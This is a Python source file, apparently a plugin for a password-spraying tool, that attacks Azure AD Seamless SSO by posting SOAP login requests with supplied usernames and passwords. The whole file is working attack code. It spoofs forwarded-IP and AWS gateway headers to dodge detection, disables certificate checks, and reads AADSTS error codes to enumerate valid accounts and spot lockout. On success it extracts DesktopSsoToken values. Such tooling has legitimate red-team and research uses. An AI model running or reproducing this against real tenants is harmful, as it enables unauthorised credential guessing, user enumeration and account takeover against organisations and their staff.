import requests, uuid, re
import utils.utils as utils
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def azuresso_authenticate(url, username, password, useragent, pluginargs):

    data_response = {
        'result' : None,    # Can be "success", "failure" or "potential"
        'error' : False,
        'output' : "",
        'valid_user' : False
    }

    if "@" not in username:
        username = username + "@" + pluginargs['domain']

    UserTokenGuid= "uuid-" + str(uuid.uuid4())
    MessageIDGuid = "urn:uuid:" + str(uuid.uuid4())
    requestid = str(uuid.uuid4())

    # Our base XML
    data = """<?xml version="1.0" encoding="UTF-8"?>
    <s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing" xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
      <s:Header>
        <a:Action s:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</a:Action>
        <a:MessageID>MessageIDPlaceholder</a:MessageID>
        <a:ReplyTo>
          <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
        </a:ReplyTo>
        <a:To s:mustUnderstand="1">https://autologon.microsoftazuread-sso.com/dewi.onmicrosoft.com/winauth/trust/2005/usernamemixed?client-request-id=30cad7ca-797c-4dba-81f6-8b01f6371013</a:To>
        <o:Security xmlns:o="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" s:mustUnderstand="1">
          <u:Timestamp u:Id="_0">
            <u:Created>2019-01-02T14:30:02.068Z</u:Created>
            <u:Expires>2019-01-02T14:40:02.068Z</u:Expires>
          </u:Timestamp>
          <o:UsernameToken u:Id="UsernameTokenPlaceholder">
            <o:Username>UsernamePlaceholder</o:Username>
            <o:Password>PasswordPlaceholder</o:Password>
          </o:UsernameToken>
        </o:Security>
      </s:Header>
      <s:Body>
        <trust:RequestSecurityToken xmlns:trust="http://schemas.xmlsoap.org/ws/2005/02/trust">
          <wsp:AppliesTo xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy">
            <a:EndpointReference>
              <a:Address>urn:federation:MicrosoftOnline</a:Address>
            </a:EndpointReference>
          </wsp:AppliesTo>
          <trust:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</trust:KeyType>
          <trust:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</trust:RequestType>
        </trust:RequestSecurityToken>
      </s:Body>
    </s:Envelope>
    """

    tempdata = data
    tempdata = tempdata.replace("UsernameTokenPlaceholder", UserTokenGuid)
    tempdata = tempdata.replace("MessageIDPlaceholder", MessageIDGuid)
    tempdata = tempdata.replace("UsernamePlaceholder", username)
    tempdata = tempdata.replace("PasswordPlaceholder", password)

    spoofed_ip = utils.generate_ip()
    amazon_id = utils.generate_id()
    trace_id = utils.generate_trace_id()

    headers = {
        'User-Agent' : useragent,
        "X-My-X-Forwarded-For" : spoofed_ip,
        "x-amzn-apigateway-api-id" : amazon_id,
        "X-My-X-Amzn-Trace-Id" : trace_id,

        'client-request-id' : requestid,
        'return-client-request-id' : 'true',
        'Content-type' : 'application/soap+xml; charset=utf-8'
    }

    headers = utils.add_custom_headers(pluginargs, headers)

    try:
        r = requests.post(f"{url}/{pluginargs['domain']}/winauth/trust/2005/usernamemixed?client-request-id={requestid}", data=tempdata, headers=headers, verify=False, timeout=30)

        xmlresponse = str(r.content)
        creds = username + ":" + password

        # check our resopnse for error/response codes
        if "AADSTS50034" in xmlresponse:
            data_response['output'] = f"[-] FAILURE: Username not found - {creds}"
            data_response['result'] = "failure"

        elif "AADSTS50126" in xmlresponse:
            data_response['output'] = f"[!] VALID_USERNAME - {creds} (invalid password)"
            data_response['result'] = "failure"
            data_response['valid_user'] = True

        elif "DesktopSsoToken" in xmlresponse:
            data_response['output'] = f"[+] SUCCESS: {creds}"
            data_response['result'] = "success"
            data_response['valid_user'] = True

            token = re.findall(r"<DesktopSsoToken>.{1,}</DesktopSsoToken>", xmlresponse)
            if (token):
                data_response['output'] += f" - GOT TOKEN {token[0]}"

        elif "AADSTS50056" in xmlresponse:
            data_response['output'] = f"[!] VALID_USERNAME - {creds} (no password in AzureAD)"
            data_response['result'] = "failure"
            data_response['valid_user'] = True

        elif "AADSTS80014" in xmlresponse:
            data_response['output'] = f"[!] VALID_USERNAME - {creds} (max pass-through authentication time exceeded)"
            data_response['result'] = "failure"
            data_response['valid_user'] = True

        elif "AADSTS50053" in xmlresponse:
            data_response['output'] = f"[?] WARNING: SMART LOCKOUT DETECTED - Unable to enumerate: {creds}"
            data_response['result'] = "potential"

        else:
            data_response['output'] = f"[?] Unknown Response : {creds}"
            data_response['result'] = "failure"


    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response
